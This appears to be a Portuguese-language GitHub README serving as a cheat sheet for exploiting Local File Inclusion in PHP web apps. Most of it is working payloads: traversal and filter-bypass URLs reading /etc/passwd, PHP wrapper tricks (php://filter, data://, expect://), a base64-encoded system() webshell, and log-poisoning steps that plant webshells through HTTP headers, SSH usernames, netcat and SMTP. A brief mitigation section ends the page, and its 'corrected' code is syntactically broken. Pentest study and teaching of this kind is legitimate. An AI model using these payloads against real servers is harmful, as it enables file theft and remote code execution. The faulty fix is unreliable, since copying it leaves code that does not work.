<img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000ff&height=120&section=header"/>

[![Typing SVG](https://readme-typing-svg.herokuapp.com/?color=0000ff&size=32&center=true&vCenter=true&width=1000&height=40&lines=Oque+é+Local+File+Inclusion?)](https://git.io/typing-svg)
> É uma vulnerabilidade em aplicações web que permite o invasor incluir arquivos locais arbitrários do servidor. Dessa forma podendo ler arquivos que contenha credenciais, arquivos confidenciais e até mesmo podendo a levar a um RCE, utilizando a técnica de Log Poisoning e Directory Traversal.

![CSRF_cheatsheet](./img/directory-traversal.svg)

<h1>Ferramentas</h1>

* [LFFY](https://github.com/mzfr/liffy)

<h1>Truques</h1>

### LFI e Directory Traversal Básico

Utilizando a técnica de Directory traversal para ler o contéudo do arquivo "/etc/passwd" que é bastante utilizado para confirmar a vulnerabilidade.

```yaml
https://www.teste.com.br/arquivo.php?img=../../../../../../../../../etc/passwd
```
### Bypass PHP Extension utilizando Null Byte

```yaml
https://www.teste.com.br/arquivo.php?img=../../../../../etc/passwd%00
```

### Bypass Filters 

```yaml
https://www.teste.com.br/arquivo.php?img=.../.../.../.../.../.../etc/passwd
https://www.teste.com.br/arquivo.php?img=..//..//..//..//..//..//etc/passwd
https://www.teste.com.br/arquivo.php?img=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
https://www.teste.com.br/arquivo.php?img=/var/www/html/../../../../../../etc/passwd
```

### Double URL Encode

```yaml
https://www.teste.com.br/arquivo.php?img=%252e%252e%252fetc%252fpasswd
```

# LFI Usando PHP Wrapper && Protocolos
> Segundo a documentação do PHP, O PHP fornece vários fluxos de E/S variados que permitem o acesso a Fluxos de entrada e saída próprios do PHP, entrada padrão, saída e erro descritores de arquivos, fluxos de arquivos temporários na memória e com backup em disco e filtros que podem manipular outros recursos de arquivo à medida que são lidos e escrito para. 

## php://filter
> É um tipo de meta-wrapper projetado para permitem realizar operações básicas de modificação nos dados antes de serem lidos.
```yaml
https://www.teste.com.br/arquivo.php?img=php://filter/convert.base64-encode/resource=index.php
```
## file://
> É possível ler arquivos do sistema

```yaml
https://wwww.teste.com.br/arquivo.php?img=file:///etc/passwd
```
## data://
> Permite a inclusão de pequenos itens de dados como dados "imediatos", como se tivessem sido incluídos externamente. (RFC 2397)

```yaml
https://wwww.teste.com.br/arquivo.php?img=data://text/plain,<?php phpinfo(); ?>
http://www.teste.com/arquivo.php?img=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
```
## Curiosidade
> É possível injetar um XSS utilizando essa técnica do data://
```yaml
https://wwww.teste.com.br/arquivo.php?img=data:application/x-httpd-php;base64,PHNjcmlwdD4gYWxlcnQoMSkgPC9zY3JpcHQ+  (<script> alert(1) </script>) 
```
## expect://
> Segundo a documentação o php esse wrapper é possível interagir com processos através de PTY
```yaml
http://www.teste.com/arquivo.php?img=expect://ls
http://www.teste.com/arquivo.php?img=expect://id
```


# LFI - Log Poisoning

## Log Poisoning Web Server
> Se a aplicação web é vulnerável a LFI, é possível tentar injetar uma webshell dentro do agente de usuário(User-Agent) ou através de um parâmetro GET, e dessa forma acessando o arquivo de log atráves do LFI como "http://www.teste.com/file.php?arquivo=/var/log/apache2&cmd=ls"
* User-Agent:
```yaml
GET /arquivo.php?file=/
Host: www.teste.com
User-Agent: <?php system($_GET['c']); ?>
```
* Parâmetro GET
```yaml
http://www.teste.com/arquivo.php?img=<?php system($_GET['cmd']); ?>
```
## Log Poisoning SSH
> Através dos logs do SSH (/var/log/auth.log), é possível utilizar a técnica através de um usuário ou via netcat
* Usuário SSH
```yaml
root@pop-os:/home/victor# ssh '<?php system($_GET['cmd']); ?>'@192.168.4.160
```
* Netcat SSH
```yaml
root@pop-os:/home/victor# nc -v teste.com.br 22
Connection to teste.com.br (31.3.2.1) 22 port [tcp/ssh] succeeded!
<?php system($_GET['c']); ?>
``` 
## Log Poisoning via /proc/self/environ
> Através desse arquivo, conseguimos injetar uma web shell no User-Agent.
```yaml
GET /arquivo.php?file=/
Host: www.teste.com
User-Agent: <?php system($_GET['c']); ?>
```

## Log Poisoning SMTP
> O arquivo de log do SMTP (/var/mail/mail.log) é possível injetar uma webshell no usuário de email
```yaml
nc -vn 192.168.4.160 25
MAIL FROM: email@gmail.com
RCPT TO: <?php system($_GET[‘cmd’]); ?>
```
<h5>
Claro que existe diversas possibilidades, porém demonstrei algumas bem utilizadas no dia a dia de um pentester.</h5>


# Como evitar um ataque de Local File Inclusion? 

* A aplicação precisar validar a entrada do usuário antes de processar o arquivo ou deve verificar se o arquivo especificado é o esperado.
* Ele deve verificar se o caminho canonizado começa com o diretório base esperado. 

## Código vulnerável - PHP
```php
if(isset($_GET['page']) && !empty($_GET['page'])){
    
    include($_GET['page']); // Onde a vulnerabilidade acontece

}else{
    echo "<center>";
    echo "</br>";
    echo "Não foi possível carregar o arquivo, por conta de não ser especificado direito!";
    echo "</center>";
}
```
## Código Corrigido - PHP

```php
if($_GET['page'] === "teste.php"){
    
    include(teste.php); // Corrigido

}else{
    echo "<center>";
    echo "</br>";
    echo "Não foi possível carregar o arquivo, por conta de não ser especificado direito!";
    echo "</center>";
}
```

# Referências

* https://github.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
* https://github.com/swisskyrepo/PayloadsAllTheThings
* https://portswigger.net
* https://book.hacktricks.xyz/pentesting-web/file-inclusion

<img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000ff&height=120&section=footer"/>
